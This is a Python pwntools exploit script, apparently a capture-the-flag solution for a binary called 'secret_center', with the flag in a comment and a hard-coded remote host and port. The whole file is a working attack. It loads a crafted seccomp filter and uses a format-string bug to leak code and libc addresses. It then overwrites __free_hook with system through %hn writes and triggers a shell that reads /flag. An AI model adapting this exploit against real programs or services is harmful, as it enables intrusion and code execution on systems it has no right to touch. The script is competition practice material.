#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'
# ctf{double_f0rtify__not_g00d}
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './secret_center'
TARGET = ('106.75.73.20', 8999)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def input_secret(secret, size):
    r.sendlineafter('>\n', '2')
    r.sendlineafter('Secret Size: ', str(size))
    r.sendlineafter('Content: \n', secret)

def delete_secret():
    r.sendlineafter('>\n', '3')

def guard_ready():
    r.sendlineafter('>\n', '4')

def set_guard():
    r.sendlineafter('>\n', '5')

def edit_secret(secret, size):
    r.sendlineafter('>\n', '6')
    r.sendlineafter('size: \n', str(size))
    r.sendlineafter('Content: \n', secret)

code = ELF(BINARY)
libc = ELF(LIBC64)

input_secret('a', 0xf0)
delete_secret()
guard_ready()
bpf = " \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x04\x02\x00\x00\x00 \x00\x00\x00\x10\x00\x00\x00T\x00\x00\x00\xFF\x0F\x00\x00\x15\x00\x00\x03|\v\x00\x00\x06\x00\x00\x00\x02\x00\x05\x00\x15\x00\x00\x01\xE7\x00\x00\x00\x06\x00\x00\x00\x02\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F"
edit_secret(bpf, len(bpf))
set_guard()

#attach(0xF48)
rop = '%016p'*25
rop += '%n'
input_secret(rop + 'a'*(0xa0-len(rop)) + '\x10', 0xa1)

input_secret('\xba\x01\x00', 120)

data = r.recvuntil('secret_center')
code_base = int(data.split('-')[0], 16)
log.info('code base %#x' % code_base)
r.recvlines(4)
data = r.recvuntil('libc-2.23.so\n')
libc_base = int(data.split('-')[0], 16)
log.info('libc base %#x' % libc_base)

#attach(0xf48)
addr = libc_base + libc.sym['system']
def ttt(addr):
    v = []
    v1 = (addr&0xffff)
    v2 = (addr&0xffff0000)>>16
    v3 = (addr&0xffff00000000)>>32
    v.append([0, v1])
    v.append([2, v2])
    v.append([4, v3])
    v = sorted(v, key=lambda a:a[1])
    #print v
    return v

v=ttt(addr)

if args.R:
    offset = 152
else:
    offset = 158

fmt  = 'sh;##'
fmt += '%02x' * 20
fmt += 'bbbbb'
fmt += '%{}c%hn'.format(str(v[0][1] - offset).rjust(5, '0'))
fmt += '%{}c%hn'.format(str(v[1][1] - v[0][1]).rjust(5, '0'))
fmt += '%{}c%hn'.format(str(v[2][1] - v[1][1]).rjust(5, '0'))
fmt +=  p64(0x31) + p64(libc_base + libc.sym['__free_hook'] + v[0][0]) 
fmt +=  p64(0x32) + p64(libc_base + libc.sym['__free_hook'] + v[1][0]) 
fmt +=  p64(0x33) + p64(libc_base + libc.sym['__free_hook'] + v[2][0]) 
fmt += 'b'*100
input_secret(fmt, len(fmt)+1)
delete_secret()

r.sendline('cat /flag;') 
r.interactive()

